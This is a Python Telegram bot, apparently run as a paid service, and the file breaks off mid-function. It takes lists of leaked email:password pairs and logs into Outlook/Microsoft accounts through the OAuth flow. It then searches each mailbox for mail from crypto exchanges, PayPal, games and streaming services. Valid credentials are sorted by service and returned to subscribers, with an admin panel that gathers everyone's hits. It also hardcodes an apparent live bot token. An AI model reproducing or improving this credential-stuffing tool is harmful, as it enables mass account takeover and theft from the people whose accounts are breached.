import asyncio
import os
import re
import json
import uuid
import time
import urllib.parse
from datetime import datetime, date, timedelta
from pathlib import Path
from collections import deque, defaultdict
from concurrent.futures import ThreadPoolExecutor
from typing import Dict, List, Tuple, Optional
from queue import Queue
import io

import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

# ================= CONFIGURATION =================
BOT_TOKEN = "8019459502:AAFEUYR5QEU0qKI9uGCuYJaC6YOLF8luwT8"  # Telegram bot token
ADMIN_IDS = [8188931353]                          # Admin user IDs
MAX_CONCURRENT_JOBS = 3                           # Maximum concurrent jobs
THREADS_PER_JOB = 15                               # Threads per job
DASHBOARD_UPDATE_INTERVAL = 100                    # Dashboard update frequency
ACCOUNT_DELAY = 0.05                                # Delay between accounts
PROXY_LIST = []                                     # Proxy list ["http://user:pass@ip:port", ...]
PROXY_ROTATION = False                               # Proxy rotation
RESULT_BASE_DIR = "results"                          # Results directory
USER_DATA_FILE = "users.json"                        # User database file

# ================= FILE SIZE LIMITS (bytes) =================
FILE_SIZE_LIMITS = {
    0: 5 * 1024 * 1024,    # Normal: 5 MB
    1: 15 * 1024 * 1024,   # VIP: 15 MB
    2: 30 * 1024 * 1024,   # VIP+: 30 MB
}

# ================= DAILY FILE UPLOAD LIMITS =================
DAILY_FILE_LIMITS = {
    0: 3,    # Normal: 3 files per day
    1: 9999, # VIP: unlimited
    2: 9999, # VIP+: unlimited
}

# ================= SENDER EMAIL -> PLATFORM NAME MAPPING =================
SENDER_MAP = {
    # Games
    "noreply@accounts.riotgames.com": "Riot Games",
    "no-reply@nordaccount.com": "NordVPN",
    "noreply@id.supercell.com": "Supercell",
    "accounts@roblox.com": "Roblox",
    "no-reply@info.coinbase.com": "Coinbase",
    "noreply@pubgmobile.com": "PUBG Mobile",
    "noreply@accounts.spotify.com": "Spotify",
    "no-reply@paypal.com": "PayPal",
    "noreply@amazon.com": "Amazon",
    "no-reply@accounts.ea.com": "EA",
    "noreply@news.ubisoft.com": "Ubisoft",
    "noreply@epicgames.com": "Epic Games",
    "no-reply@discord.com": "Discord",
    "noreply@twitch.tv": "Twitch",
    "no-reply@steampowered.com": "Steam",
    "noreply@battle.net": "Battle.net",
    "noreply@rockstargames.com": "Rockstar",
    "noreply@minecraft.net": "Minecraft",
    "noreply@mojang.com": "Mojang",
    "noreply@xbox.com": "Xbox",
    "noreply@playstation.com": "PlayStation",
    "noreply@nintendo.com": "Nintendo",
    "no-reply@ea.com": "EA",
    "noreply@fortnite.com": "Fortnite",
    "noreply@pubg.com": "PUBG",
    "noreply@valorant.com": "Valorant",
    "noreply@leagueoflegends.com": "League of Legends",
    # Streaming
    "no-reply@netflix.com": "Netflix",
    "noreply@disneyplus.com": "Disney+",
    "no-reply@hulu.com": "Hulu",
    "noreply@hbomax.com": "HBO Max",
    "noreply@primevideo.com": "Amazon Prime",
    "no-reply@paramountplus.com": "Paramount+",
    "noreply@crunchyroll.com": "Crunchyroll",
    "noreply@plex.tv": "Plex",
    "no-reply@youtube.com": "YouTube",
    # Music
    "no-reply@spotify.com": "Spotify",
    "noreply@music.apple.com": "Apple Music",
    "noreply@tidal.com": "Tidal",
    "noreply@deezer.com": "Deezer",
    "noreply@soundcloud.com": "SoundCloud",
    # Crypto & Finance
    "no-reply@binance.com": "Binance",
    "noreply@coinbase.com": "Coinbase",
    "noreply@kraken.com": "Kraken",
    "noreply@kucoin.com": "KuCoin",
    "noreply@bybit.com": "Bybit",
    "noreply@crypto.com": "Crypto.com",
    "noreply@metamask.io": "MetaMask",
    "no-reply@ledger.com": "Ledger",
    "no-reply@blockchain.com": "Blockchain",
    # Storage / Office / Subscription
    "noreply@dropbox.com": "Dropbox",
    "noreply@googledrive.com": "Google Drive",
    "noreply@onedrive.com": "OneDrive",
    "noreply@microsoft.com": "Microsoft",
    "noreply@icloud.com": "iCloud",
    "noreply@mega.nz": "MEGA",
    "noreply@canva.com": "Canva",
    "noreply@adobe.com": "Adobe",
    "noreply@slack.com": "Slack",
    "noreply@zoom.us": "Zoom",
    # E-commerce & Other
    "noreply@ebay.com": "eBay",
    "noreply@nike.com": "Nike",
    "no-reply@nordvpn.com": "NordVPN",
    "noreply@expressvpn.com": "ExpressVPN",
    "noreply@facebook.com": "Facebook",
    "noreply@instagram.com": "Instagram",
    "noreply@twitter.com": "Twitter (X)",
    "noreply@linkedin.com": "LinkedIn",
    "noreply@tiktok.com": "TikTok",
    "noreply@reddit.com": "Reddit",
    "noreply@telegram.org": "Telegram",
    "noreply@uber.com": "Uber",
    "noreply@airbnb.com": "Airbnb",
    # Development & Education
    "noreply@github.com": "GitHub",
    "noreply@gitlab.com": "GitLab",
    "noreply@stackoverflow.com": "Stack Overflow",
    "noreply@medium.com": "Medium",
    "noreply@patreon.com": "Patreon",
    "noreply@udemy.com": "Udemy",
    "noreply@duolingo.com": "Duolingo",
    # Design
    "noreply@figma.com": "Figma",
    "noreply@accounts.google.com": "Google",
    "noreply@paypal.com": "PayPal",
    "noreply@apple.com": "Apple",
}

# All sender patterns for search query
SENDER_PATTERNS = list(SENDER_MAP.keys())

# ================= SESSION POOL =================
class SessionPool:
    """HTTP session pool for connection reuse"""
    def __init__(self, pool_size=30):
        self.pool_size = pool_size
        self.sessions = Queue()
        self._init_pool()
    
    def _init_pool(self):
        for _ in range(self.pool_size):
            session = requests.Session()
            # Connection pooling settings
            adapter = requests.adapters.HTTPAdapter(
                pool_connections=20,
                pool_maxsize=20,
                max_retries=2,
                pool_block=False
            )
            session.mount('http://', adapter)
            session.mount('https://', adapter)
            self.sessions.put(session)
    
    def get_session(self):
        return self.sessions.get()
    
    def return_session(self, session):
        session.cookies.clear()
        self.sessions.put(session)

# Global session pool
session_pool = SessionPool(pool_size=THREADS_PER_JOB * 3)

# ================= TIME MANAGER =================
def get_today_istanbul():
    """Returns today's date in Istanbul timezone (UTC+3)"""
    utc_now = datetime.utcnow()
    istanbul_now = utc_now + timedelta(hours=3)
    return istanbul_now.date()

# ================= USER DATABASE =================
def load_users():
    if os.path.exists(USER_DATA_FILE):
        with open(USER_DATA_FILE, "r") as f:
            return json.load(f)
    return {}

def save_users(users):
    with open(USER_DATA_FILE, "w") as f:
        json.dump(users, f, indent=2, ensure_ascii=False)

def get_user(user_id: int) -> dict:
    users = load_users()
    user_id_str = str(user_id)
    today = get_today_istanbul().isoformat()
    
    if user_id_str not in users:
        users[user_id_str] = {
            "vip_level": 0,
            "total_jobs": 0,
            "total_hits": 0,
            "daily_stats": {
                "date": today,
                "files_uploaded": 0
            }
        }
        save_users(users)
        print(f"👤 New user created: {user_id}")
    else:
        # Reset daily counter if day changed
        if users[user_id_str].get("daily_stats", {}).get("date") != today:
            users[user_id_str]["daily_stats"] = {
                "date": today,
                "files_uploaded": 0
            }
        
        # Check for missing fields
        if "vip_level" not in users[user_id_str]:
            users[user_id_str]["vip_level"] = 0
        if "total_jobs" not in users[user_id_str]:
            users[user_id_str]["total_jobs"] = 0
        if "total_hits" not in users[user_id_str]:
            users[user_id_str]["total_hits"] = 0
        
        save_users(users)
    
    return users[user_id_str]

def update_user(user_id: int, data: dict):
    users = load_users()
    users[str(user_id)].update(data)
    save_users(users)

def increment_daily_file_count(user_id: int):
    users = load_users()
    user_id_str = str(user_id)
    today = get_today_istanbul().isoformat()
    
    if "daily_stats" not in users[user_id_str]:
        users[user_id_str]["daily_stats"] = {"date": today, "files_uploaded": 0}
    elif users[user_id_str]["daily_stats"].get("date") != today:
        users[user_id_str]["daily_stats"] = {"date": today, "files_uploaded": 0}
    
    users[user_id_str]["daily_stats"]["files_uploaded"] += 1
    save_users(users)

# ================= OUTLOOK SENDER-BASED CHECKER =================
class OutlookSenderChecker:
    # Pre-compiled regex patterns
    PPFT_PATTERN1 = re.compile(r'name=\\"PPFT\\".*?value=\\"(.*?)\\"')
    PPFT_PATTERN2 = re.compile(r'name="PPFT".*?value="([^"]*)"')
    URLPOST_PATTERN1 = re.compile(r'urlPost":"(.*?)"')
    URLPOST_PATTERN2 = re.compile(r"urlPost:'(.*?)'")
    UAID_PATTERN1 = re.compile(r'name=\\"uaid\\" id=\\"uaid\\" value=\\"(.*?)\\"')
    UAID_PATTERN2 = re.compile(r'name="uaid" id="uaid" value="(.*?)"')
    OPID_PATTERN = re.compile(r'opid%3d(.*?)%26')
    OPIDT_PATTERN = re.compile(r'opidt%3d(.*?)&')
    CODE_PATTERN = re.compile(r'code=(.*?)&')
    
    def __init__(self):
        self.session = session_pool.get_session()
        self.ua = "Mozilla/5.0 (Linux; Android 10; Samsung Galaxy S20) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
        self.client_id = "e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
        self.redirect_uri = "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D"

    def __del__(self):
        if hasattr(self, 'session'):
            session_pool.return_session(self.session)

    def get_regex(self, pattern, text):
        match = pattern.search(text)
        return match.group(1) if match else None

    def extract_ppft(self, html):
        match = self.PPFT_PATTERN1.search(html)
        if match: return match.group(1)
        match = self.PPFT_PATTERN2.search(html)
        if match: return match.group(1)
        return None

    def search_emails_by_sender(self, token, cid, email, password):
        url = "https://outlook.live.com/search/api/v2/query?n=124&cv=tNZ1DVP5NhDwG%2FDUCelaIu.124"
        query_string = " OR ".join(f'"{pattern}"' for pattern in SENDER_PATTERNS)
        
        payload = {
            "Cvid": str(uuid.uuid4()),
            "Scenario": {"Name": "owa.react"},
            "TimeZone": "UTC",
            "TextDecorations": "Off",
            "EntityRequests": [{
                "EntityType": "Message",
                "ContentSources": ["Exchange"],
                "Query": {"QueryString": query_string},
                "Size": 25,
                "Sort": [{"Field": "Time", "SortDirection": "Desc"}],
                "EnableTopResults": False
            }],
            "AnswerEntityRequests": [],
            "QueryAlterationOptions": {"EnableSuggestion": False, "EnableAlteration": False}
        }
        
        headers = {
            "Authorization": f"Bearer {token}",
            "X-AnchorMailbox": f"CID:{cid}",
            "Content-Type": "application/json",
            "User-Agent": "Outlook-Android/2.0",
            "Connection": "keep-alive"
        }

        try:
            r = self.session.post(url, json=payload, headers=headers, timeout=8)
            if r.status_code == 200:
                data = r.json()
                try:
                    results = data['EntitySets'][0]['ResultSets'][0]['Results']
                except (KeyError, IndexError):
                    results = []
                
                if results:
                    platform_counts = {}
                    hit_details = []

                    for item in results:
                        source = item.get('Source', {})
                        subject = source.get('Subject') or "No Subject"
                        
                        sender_address = "Unknown"
                        if 'Sender' in source and 'EmailAddress' in source['Sender']:
                            sender_address = source['Sender']['EmailAddress'].get('Address', 'Unknown')
                        
                        platform = SENDER_MAP.get(sender_address, sender_address)
                        platform_counts[platform] = platform_counts.get(platform, 0) + 1
                        
                        hit_details.append({"sender": sender_address, "subject": subject})
                    
                    return {"status": "HIT", "platform_counts": platform_counts, "details": hit_details[:3]}
                else:
                    return {"status": "FREE", "platform_counts": {}, "details": []}
            else:
                return {"status": "ERROR_API"}
        except Exception:
            return {"status": "ERROR_API"}

    def check_account(self, email, password):
        self.session.cookies.clear()
        
        try:
            # --- STEP 1: AUTH INIT ---
            url_auth = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&client_id={self.client_id}&mkt=en&response_type=code&redirect_uri={urllib.parse.quote(self.redirect_uri)}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            headers = {"User-Agent": self.ua, "Connection": "keep-alive"}
            
            r1 = self.session.get(url_auth, headers=headers, allow_redirects=False, timeout=8)
            if r1.status_code != 302:
                return "ERROR_NET"

            next_url = r1.headers['Location']
            r2 = self.session.get(next_url, headers=headers, allow_redirects=False, timeout=8)
            
            ppft = self.extract_ppft(r2.text)
            url_post = self.get_regex(self.URLPOST_PATTERN1, r2.text) or self.get_regex(self.URLPOST_PATTERN2, r2.text)

            if not ppft:
                return "ERROR_PARAMS"

            # --- STEP 2: LOGIN ---
            data_login = {
                "i13": "1", "login": email, "loginfmt": email, "type": "11", "LoginOptions": "1",
                "passwd": password, "ps": "2", "PPFT": ppft, "PPSX": "Passport", "NewUser": "1", "i19": "3772"
            }
            headers_post = {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": self.ua, "Connection": "keep-alive"}
            r3 = self.session.post(url_post, data=data_login, headers=headers_post, allow_redirects=False, timeout=8)

            if "incorrect" in r3.text.lower() or ("password" in r3.text.lower() and "error" in r3.text.lower()):
                return "BAD"

            # --- STEP 3: OAUTH REDIRECT ---
            if r3.status_code == 302 and "Location" in r3.headers:
                oauth_url = r3.headers['Location']
            else:
                uaid = self.get_regex(self.UAID_PATTERN1, r3.text) or self.get_regex(self.UAID_PATTERN2, r3.text)
                opid = self.get_regex(self.OPID_PATTERN, r3.text)
                opidt = self.get_regex(self.OPIDT_PATTERN, r3.text)
                
                if uaid and opid:
                    oauth_url = f"https://login.live.com/oauth20_authorize.srf?uaid={uaid}&client_id={self.client_id}&opid={opid}&mkt=EN-US&opidt={opidt}&res=success&route=C105_BAY"
                else:
                    return "BAD"

            # --- STEP 4: GET CODE ---
            code = None
            if oauth_url.startswith("msauth://"):
                code = self.get_regex(self.CODE_PATTERN, oauth_url)
            else:
                r4 = self.session.get(oauth_url, allow_redirects=False, timeout=8)
                code = self.get_regex(self.CODE_PATTERN, r4.headers.get('Location', ''))

            if not code:
                return "2FA"

            # --- STEP 5: GET TOKEN ---
            data_token = {
                "client_info": "1", "client_id": self.client_id, "redirect_uri": self.redirect_uri,
                "grant_type": "authorization_code", "code": code,
                "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
            }
            r5 = self.session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=data_token, timeout=8)
            
            if r5.status_code == 200:
                token = r5.json().get('access_token')
                mspcid = self.session.cookies.get("MSPCID", "")
                cid = mspcid.upper() if mspcid else "0000000000000000"
                
                return self.search_emails_by_sender(token, cid, email, password)
            else:
                return "ERROR_TOKEN"

        except requests.exceptions.Timeout:
            return "ERROR_TIMEOUT"
        except Exception as e:
            return "ERROR_SYS"

# ================= RESULT MANAGER =================
class ResultManager:
    def __init__(self, combo_filename, base_dir="result"):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.base_folder = os.path.join(base_dir, f"({timestamp})_{combo_filename}_multi_hits")
        self.hits_file = os.path.join(self.base_folder, "hits.txt")
        self.free_file = os.path.join(self.base_folder, "free.txt")  # NEW: Free accounts file
        self.services_folder = os.path.join(self.base_folder, "services")
        
        Path(self.services_folder).mkdir(parents=True, exist_ok=True)
        
    def save_hit(self, email, password, result_data):
        platform_counts = result_data.get("platform_counts", {})
        services_str = " | ".join([f"{platform}: {count}" for platform, count in sorted(platform_counts.items())])
        
        # Save to hits file with platform info
        with open(self.hits_file, 'a', encoding='utf-8') as f:
            f.write(f"{email}:{password} | {services_str}\n")
        
        # Save to platform-specific files
        for platform in platform_counts.keys():
            service_file = os.path.join(self.services_folder, f"{platform}_hits.txt")
            with open(service_file, 'a', encoding='utf-8') as f:
                f.write(f"{email}:{password}\n")
    
    def save_free(self, email, password):
        """Save free account (no hits found)"""
        with open(self.free_file, 'a', encoding='utf-8') as f:
            f.write(f"{email}:{password}\n")

# ================= JOB CLASS =================
class Job:
    def __init__(self, user_id, chat_id, combo_list, filename, priority=1):
        self.user_id = user_id
        self.chat_id = chat_id
        self.combo_list = combo_list
        self.filename = filename
        self.total = len(combo_list)
        self.checked = 0
        self.hits = 0
        self.free = 0
        self.bads = 0
        self.twofa = 0
        self.errors = 0
        self.start_time = None
        self.status = "queued"
        self.last_hits = deque(maxlen=5)
        self.dashboard_msg_id = None
        self.lock = asyncio.Lock()
        self.cancel_event = asyncio.Event()
        self.result_manager = None
        self.priority = priority  # 0: VIP, 1: normal

    def __lt__(self, other):
        return self.priority < other.priority

# ================= DASHBOARD FORMATTER =================
def format_dashboard_html(job: Job, speed=0.0, eta="--"):
    completed = (job.checked / job.total * 100) if job.total else 0
    success_rate = (job.hits / job.checked * 100) if job.checked else 0

    last_hits_lines = []
    for email, platforms in job.last_hits:
        safe_email = email.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        safe_platforms = str(platforms).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        last_hits_lines.append(f"📧 {safe_email} | {safe_platforms}")
    last_hits_text = "\n".join(last_hits_lines) if last_hits_lines else "No hits yet..."

    return f"""🚀 <b>PREMIUM PROCESSING - LIVE DASHBOARD</b>

📊 <b>REAL-TIME ANALYTICS</b>
• 📋 Total Accounts: <code>{job.total}</code>
• 🔄 Progress: <code>{job.checked}/{job.total}</code>
• 📈 Completed: <code>{completed:.1f}%</code>

⚡ <b>RESULTS</b>
• ✅ HIT: <code>{job.hits}</code>
• 🆓 FREE: <code>{job.free}</code>
• ❌ BAD: <code>{job.bads}</code>
• 🔐 2FA: <code>{job.twofa}</code>
• ⚠️ Errors: <code>{job.errors}</code>
• 🎯 Success Rate: <code>{success_rate:.1f}%</code>

⏱️ <b>PERFORMANCE</b>
• ⚡ Speed: <code>{speed:.1f} acc/sec</code>
• 🕒 ETA: <code>{eta}</code>

🔔 <b>LAST {len(job.last_hits)} HITS:</b>
{last_hits_text}

⏰ {datetime.now().strftime("%H:%M:%S")}
"""

# ================= GLOBAL QUEUE =================
job_queue = asyncio.PriorityQueue()
user_jobs = {}
executor = ThreadPoolExecutor(max_workers=THREADS_PER_JOB * 2)

# ================= PROCESSING FUNCTIONS =================
async def process_job(job: Job, bot):
    job.status = "running"
    job.start_time = time.time()
    job.result_manager = ResultManager(
        combo_filename=job.filename,
        base_dir=f"{RESULT_BASE_DIR}/{job.user_id}"
    )

    # Separate lists for hits and free accounts
    hit_accounts = []      # List of (email, password, platforms)
    free_accounts = []      # List of (email, password)

    account_queue = asyncio.Queue()
    for email, pwd in job.combo_list:
        await account_queue.put((email, pwd))

    async def update_stats(result, email, pwd):
        async with job.lock:
            job.checked += 1
            if isinstance(result, dict) and result.get("status") == "HIT":
                job.hits += 1
                platform_counts = result.get("platform_counts", {})
                platforms_list = list(platform_counts.keys())
                job.last_hits.append((email, platforms_list))
                
                # Save to result manager
                job.result_manager.save_hit(email, pwd, result)
                
                # Add to hit list for user notification
                hit_accounts.append((email, pwd, platform_counts))
                
                # Update user's total hits
                user = get_user(job.user_id)
                update_user(job.user_id, {"total_hits": user['total_hits'] + 1})
                
            elif isinstance(result, dict) and result.get("status") == "FREE":
                job.free += 1
                # Save free account
                job.result_manager.save_free(email, pwd)
                free_accounts.append((email, pwd))
            elif result == "BAD":
                job.bads += 1
            elif result == "2FA":
                job.twofa += 1
            else:
                job.errors += 1

            if job.checked % DASHBOARD_UPDATE_INTERVAL == 0 or job.checked == job.total:
                await update_dashboard(job, bot)

    async def worker(worker_id):
        while not job.cancel_event.is_set():
            try:
                email, pwd = await asyncio.wait_for(account_queue.get(), timeout=1.0)
            except asyncio.TimeoutError:
                break

            checker = OutlookSenderChecker()
            loop = asyncio.get_event_loop()
            raw_result = await loop.run_in_executor(executor, checker.check_account, email, pwd)
            
            await update_stats(raw_result, email, pwd)
            account_queue.task_done()
            
            await asyncio.sleep(ACCOUNT_DELAY)

    workers = [asyncio.create_task(worker(i)) for i in range(THREADS_PER_JOB)]

    try:
        await asyncio.gather(*workers)
    except asyncio.CancelledError:
        job.cancel_event.set()
        await asyncio.gather(*workers, return_exceptions=True)
        job.status = "cancelled"
    else:
        job.status = "completed"
    finally:
        await update_dashboard(job, bot)
        
        # Send HIT accounts file to user
        if hit_accounts:
            hit_content = ""
            for email, pwd, platforms in hit_accounts:
                platform_str = ", ".join([f"{p}: {c}" for p, c in platforms.items()])
                hit_content += f"{email}:{pwd} | {platform_str}\n"
            
            hit_file = io.BytesIO(hit_content.encode())
            hit_file.name = f"@Hotma1lch3ckerBot_hits_{job.user_id}.txt"
            
            await bot.send_document(
                chat_id=job.chat_id,
                document=hit_file,
                caption=f"🎯 *HIT Accounts Found: {len(hit_accounts)}*",
                parse_mode=ParseMode.MARKDOWN
            )
        
        # Send FREE accounts file to user
        if free_accounts:
            free_content = "\n".join([f"{email}:{pwd}" for email, pwd in free_accounts])
            free_file = io.BytesIO(free_content.encode())
            free_file.name = f"@Hotma1lch3ckerBot_normal_{job.user_id}.txt"
            
            await bot.send_document(
                chat_id=job.chat_id,
                document=free_file,
                caption=f"🆓 *FREE Accounts (No Services): {len(free_accounts)}*",
                parse_mode=ParseMode.MARKDOWN
            )
        
        # Send summary
        summary = f"""📊 *Job Summary*

✅ HIT: {job.hits}
🆓 FREE: {job.free}
❌ BAD: {job.bads}
🔐 2FA: {job.twofa}
⚠️ Errors: {job.errors}

📁 Files sent:
• Hits: `@Hotma1lch3ckerBot_hits_{job.user_id}.txt`
• Free: `@Hotma1lch3ckerBot_normal_{job.user_id}.txt`
"""
        await bot.send_message(
            chat_id=job.chat_id,
            text=summary,
            parse_mode=ParseMode.MARKDOWN
        )

async def update_dashboard(job: Job, bot):
    elapsed = time.time() - job.start_time if job.start_time else 0
    speed = job.checked / elapsed if elapsed > 0 else 0
    remaining = (job.total - job.checked) / speed if speed > 0 else 0
    eta = f"{int(remaining//60)}m {int(remaining%60)}s" if remaining else "--"

    text = format_dashboard_html(job, speed, eta)
    try:
        await bot.edit_message_text(
            chat_id=job.chat_id,
            message_id=job.dashboard_msg_id,
            text=text,
            parse_mode=ParseMode.HTML
        )
    except Exception:
        pass

async def queue_worker(bot):
    while True:
        job = await job_queue.get()
        if job.status == "cancelled":
            continue
        msg = await bot.send_message(
            chat_id=job.chat_id,
            text=format_dashboard_html(job),
            parse_mode=ParseMode.HTML
        )
        job.dashboard_msg_id = msg.message_id
        await process_job(job, bot)
        status_text = "✅ Job completed!" if job.status == "completed" else "❌ Job cancelled."
        await bot.send_message(chat_id=job.chat_id, text=status_text)
        if job.user_id in user_jobs and user_jobs[job.user_id] is job:
            del user_jobs[job.user_id]
        job_queue.task_done()

# ================= DAILY RESET =================
async def daily_reset_check():
    last_check_date = None
    while True:
        today = get_today_istanbul()
        if last_check_date != today:
            users = load_users()
            changed = False
            for user_id in users:
                if users[user_id].get("daily_stats", {}).get("date") != today.isoformat():
                    users[user_id]["daily_stats"] = {
                        "date": today.isoformat(),
                        "files_uploaded": 0
                    }
                    changed = True
                
                if "vip_level" not in users[user_id]:
                    users[user_id]["vip_level"] = 0
                    changed = True
                if "total_jobs" not in users[user_id]:
                    users[user_id]["total_jobs"] = 0
                    changed = True
                if "total_hits" not in users[user_id]:
                    users[user_id]["total_hits"] = 0
                    changed = True
            
            if changed:
                save_users(users)
                print(f"[{datetime.now()}] Daily counters reset.")
            last_check_date = today
        await asyncio.sleep(3600)

# ================= ADMIN PANEL =================
async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Admin command only.")
        return
    
    keyboard = [
        [InlineKeyboardButton("📊 Dashboard", callback_data="admin_dashboard")],
        [InlineKeyboardButton("📁 All Hits", callback_data="admin_all_hits")],
        [InlineKeyboardButton("👥 User List", callback_data="admin_user_list")],
        [InlineKeyboardButton("📂 User Files", callback_data="admin_user_files")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "👑 *Admin Panel*\n\nChoose an option:",
        parse_mode=ParseMode.MARKDOWN,
        reply_markup=reply_markup
    )

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await query.edit_message_text("❌ Unauthorized")
        return
    
    data = query.data
    
    if data == "admin_dashboard":
        # Show statistics
        users = load_users()
        total_users = len(users)
        total_jobs = sum(u.get('total_jobs', 0) for u in users.values())
        total_hits = sum(u.get('total_hits', 0) for u in users.values())
        total_files_today = sum(u.get('daily_stats', {}).get('files_uploaded', 0) for u in users.values())
        
        # Count files in results directory
        total_result_files = 0
        if os.path.exists(RESULT_BASE_DIR):
            for root, dirs, files in os.walk(RESULT_BASE_DIR):
                total_result_files += len([f for f in files if f.endswith('.txt')])
        
        text = f"""📊 *Admin Dashboard*

👥 **Total Users:** {total_users}
📋 **Total Jobs:** {total_jobs}
🎯 **Total Hits:** {total_hits}
📁 **Files Today:** {total_files_today}
📚 **Result Files:** {total_result_files}

📂 Results Directory: `{RESULT_BASE_DIR}`
"""
        await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN)
        
    elif data == "admin_all_hits":
        # Collect all hits from all users
        all_hits = []
        if os.path.exists(RESULT_BASE_DIR):
            for user_dir in os.listdir(RESULT_BASE_DIR):
                user_path = os.path.join(RESULT_BASE_DIR, user_dir)
                if os.path.isdir(user_path):
                    for job_dir in os.listdir(user_path):
                        job_path = os.path.join(user_path, job_dir)
                        hits_file = os.path.join(job_path, "hits.txt")
                        if os.path.exists(hits_file):
                            with open(hits_file, 'r', encoding='utf-8') as f:
                                all_hits.extend(f.readlines())
        
        if not all_hits:
            await query.edit_message_text("No hits found.")
            return
        
        # Create a single file with all hits
        hits_text = "".join(all_hits[-100:])  # Last 100 hits
        hits_file = io.BytesIO(hits_text.encode())
        hits_file.name = "all_hits.txt"
        
        await query.message.reply_document(
            document=hits_file,
            caption=f"📁 All Hits (Total: {len(all_hits)})\nShowing last 100 hits."
        )
        
    elif data == "admin_user_list":
        users = load_users()
        if not users:
            await query.edit_message_text("No users found.")
            return
        
        text = "👥 *User List*\n\n"
        level_names = {0: "👤 Normal", 1: "⭐ VIP", 2: "👑 VIP+"}
        
        for uid, data in users.items():
            level = data.get('vip_level', 0)
            jobs = data.get('total_jobs', 0)
            hits = data.get('total_hits', 0)
            daily = data.get('daily_stats', {}).get('files_uploaded', 0)
            
            text += f"**ID:** `{uid}`\n"
            text += f"**Level:** {level_names[level]}\n"
            text += f"**Jobs:** {jobs} | **Hits:** {hits} | **Today:** {daily}\n\n"
            
            if len(text) > 3500:
                text += "..."
                break
        
        await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN)
        
    elif data == "admin_user_files":
        users = load_users()
        keyboard = []
        for uid in list(users.keys())[:10]:  # First 10 users
            keyboard.append([InlineKeyboardButton(
                f"User {uid}", 
                callback_data=f"admin_user_{uid}"
            )])
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            "📂 *Select User:*",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=reply_markup
        )
    
    elif data.startswith("admin_user_"):
        target_id = data.replace("admin_user_", "")
        user_path = os.path.join(RESULT_BASE_DIR, target_id)
        
        if not os.path.exists(user_path):
            await query.edit_message_text(f"No files found for user {target_id}")
            return
        
        # List all job directories
        jobs = []
        for job_dir in os.listdir(user_path):
            job_path = os.path.join(user_path, job_dir)
            if os.path.isdir(job_path):
                hits_file = os.path.join(job_path, "hits.txt")
                if os.path.exists(hits_file):
                    with open(hits_file, 'r', encoding='utf-8') as f:
                        hit_count = len(f.readlines())
                else:
                    hit_count = 0
                jobs.append((job_dir, hit_count))
        
        if not jobs:
            await query.edit_message_text(f"No jobs found for user {target_id}")
            return
        
        text = f"📂 *User {target_id} Files*\n\n"
        keyboard = []
        for job_dir, hit_count in jobs[-10:]:  # Last 10 jobs
            display_name = job_dir[:20] + "..." if len(job_dir) > 20 else job_dir
            keyboard.append([InlineKeyboardButton(
                f"📁 {display_name} (Hits: {hit_count})",
                callback_data=f"admin_job_{target_id}_{job_dir}"
            )])
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            text,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=reply_markup
        )
    
    elif data.startswith("admin_job_"):
        parts = data.replace("admin_job_", "").split("_", 1)
        if len(parts) != 2:
            return
        target_id, job_dir = parts
        
        job_path = os.path.join(RESULT_BASE_DIR, target_id, job_dir)
        hits_file = os.path.join(job_path, "hits.txt")
        free_file = os.path.join(job_path, "free.txt")
        
        # Send both files if they exist
        if os.path.exists(hits_file):
            with open(hits_file, 'r', encoding='utf-8') as f:
                hits_content = f.read()
            hits_io = io.BytesIO(hits_content.encode())
            hits_io.name = f"user_{target_id}_hits.txt"
            await query.message.reply_document(
                document=hits_io,
                caption=f"📁 Hits for user {target_id}\nJob: {job_dir}"
            )
        
        if os.path.exists(free_file):
            with open(free_file, 'r', encoding='utf-8') as f:
                free_content = f.read()
            free_io = io.BytesIO(free_content.encode())
            free_io.name = f"user_{target_id}_free.txt"
            await query.message.reply_document(
                document=free_io,
                caption=f"🆓 Free accounts for user {target_id}\nJob: {job_dir}"
            )

# ================= BOT COMMANDS =================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = get_user(user_id)
    level_names = {0: "👤 Normal", 1: "⭐ VIP", 2: "👑 VIP+"}
    daily_files = user['daily_stats']['files_uploaded']
    daily_limit = DAILY_FILE_LIMITS[user['vip_level']]
    limit_text = f"{daily_files}/{daily_limit if daily_limit < 9999 else '∞'}"
    
    text = f"""👋 *Welcome!*

**Your Level:** {level_names[user['vip_level']]}
**Today:** {limit_text} files

📎 Upload a `.txt` file (each line: `email:password`)
Bot will scan for 200+ platforms

*Commands:*
/stats – Your statistics
/cancel – Cancel current job"""

    # Add admin panel button for admins
    if user_id in ADMIN_IDS:
        text += "\n/admin – Admin Panel"
    
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = get_user(user_id)
